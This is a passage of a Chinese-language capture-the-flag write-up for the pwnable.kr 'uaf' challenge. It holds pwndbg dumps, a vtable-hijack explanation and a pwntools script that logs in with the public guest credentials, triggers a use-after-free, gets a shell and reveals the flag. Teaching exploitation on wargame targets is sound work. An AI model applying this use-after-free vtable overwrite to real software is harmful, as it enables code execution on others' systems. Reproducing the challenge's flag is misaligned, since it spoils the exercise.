+ R9   0x7ffff7e0be78 —▸ 0x602210 —▸ 0x7ffff7ca76c0 (__cxxabiv1::__class_type_info::~__class_type_info()) ◂— endbr64                                                                                 
+ R10  0x7ffff7c1ee50 ◂— 0xd00220000cec4
+ R11  0x7ffff7ced490 ◂— endbr64 
+ R12  0x7fffffffddc0 —▸ 0x614ec8 ◂— 0x6b63614a /* 'Jack' */
+ R13  0x7fffffffdf38 —▸ 0x7fffffffe297 ◂— 'COLORFGBG=15;0'
+ R14  0x0
+ R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
+ RBP  0x7fffffffde10 ◂— 0x1
+ RSP  0x7fffffffddb0 —▸ 0x7fffffffdf28 —▸ 0x7fffffffe276 ◂— '/home/tyd/ctf/pwn/pwnable.kr/uaf'
+ RIP  0x400f18 (main+84) ◂— mov    qword ptr [rbp - 0x38], rbx
+────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
+ ► 0x400f18 <main+84>     mov    qword ptr [rbp - 0x38], rbx
+   0x400f1c <main+88>     lea    rax, [rbp - 0x50]
+   0x400f20 <main+92>     mov    rdi, rax
+   0x400f23 <main+95>     call   0x400d00                      <0x400d00>
+ 
+   0x400f28 <main+100>    lea    rax, [rbp - 0x12]
+   0x400f2c <main+104>    mov    rdi, rax
+   0x400f2f <main+107>    call   std::allocator<char>::~allocator()@plt                      <std::allocator<char>::~allocator()@plt>                                                               
+ 
+   0x400f34 <main+112>    lea    rax, [rbp - 0x11]
+   0x400f38 <main+116>    mov    rdi, rax
+   0x400f3b <main+119>    call   std::allocator<char>::allocator()@plt                      <std::allocator<char>::allocator()@plt>                                                                 
+ 
+   0x400f40 <main+124>    lea    rdx, [rbp - 0x11]
+────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
+00:0000│ rsp     0x7fffffffddb0 —▸ 0x7fffffffdf28 —▸ 0x7fffffffe276 ◂— '/home/tyd/ctf/pwn/pwnable.kr/uaf'
+01:0008│         0x7fffffffddb8 ◂— 0x1f7e16e48
+02:0010│ rsi r12 0x7fffffffddc0 —▸ 0x614ec8 ◂— 0x6b63614a /* 'Jack' */
+03:0018│         0x7fffffffddc8 —▸ 0x7ffff7d14344 ◂— xor    eax, eax
+04:0020│         0x7fffffffddd0 —▸ 0x7ffff7e18ff0 ◂— 0x2
+05:0028│         0x7fffffffddd8 —▸ 0x7ffff7e18ff0 ◂— 0x2
+06:0030│         0x7fffffffdde0 —▸ 0x7ffff7e16f60 (std::wcerr) —▸ 0x7ffff7e113f0 —▸ 0x7ffff7d2f540 ◂— endbr64 
+07:0038│         0x7fffffffdde8 —▸ 0x7ffff7cb9095 (std::ios_base::Init::Init()+1701) ◂— mov    rax, qword ptr [rip + 0x15a1fc]                                                                      
+──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
+ ► f 0         0x400f18 main+84
+   f 1   0x7ffff7a4618a __libc_start_call_main+122
+   f 2   0x7ffff7a46245 __libc_start_main+133
+   f 3         0x400e09 _start+41
+──────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+可以看到`Man`类的虚函数表（`vtable`）地址是`0x401570`，而`Man`类的`give_shell()`函数的起始地址是`0x40117a`。
+
+```assembly
+ RAX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
+ RBX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
+```
+
+查看`0x401570`地址的内容，可以知道`Man`类的`introduce()`函数起始地址是`0x4012d2`。
+
+```assembly
+pwndbg> x/4x 0x401570
+0x401570 <vtable for Man+16>:   0x0040117a      0x00000000      0x004012d2      0x00000000
+```
+
+所以我们可以申请一定内存，并写入一些数据让程序在执行选项`1`中的`introduce()`函数的时候实际调用`give_shell()`。
+
+`m->introduce()`函数的工作方式是先访问虚函数表（`vtable`）的地址`0x401570`，此时它会找到`introduce()`和`give_shell()`这两个函数的地址，并且会调用`*vtable_address+8`，因此我们可以设置`vtable_address = vtable_address - 8 = 0x401570 - 8 = 0x401568`来让程序执行`give_shell()`。编写`Python`代码求解，获得`shell`后输入`cat flag`拿到`yay_f1ag_aft3r_pwning`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+shell = ssh(user='uaf', host='pwnable.kr', port=2222, password='guest')
+# shell.download("/home/uaf/uaf", "./uaf")
+io = shell.process(executable='./uaf', argv=['uaf', '24', '/dev/stdin'])
+io.sendlineafter('free\n', b'3')
+io.sendlineafter('free\n', b'2')
+# payload = b'\x68\x15\x40\x00\x00\x00\x00\x00'  # 0x401568
+payload = p64(0x401568)
+io.sendline(payload)
+io.sendlineafter('free\n', b'2')
+io.sendline(payload)
+io.sendlineafter('free\n', b'1')
+io.interactive()
+```
+
+------
+
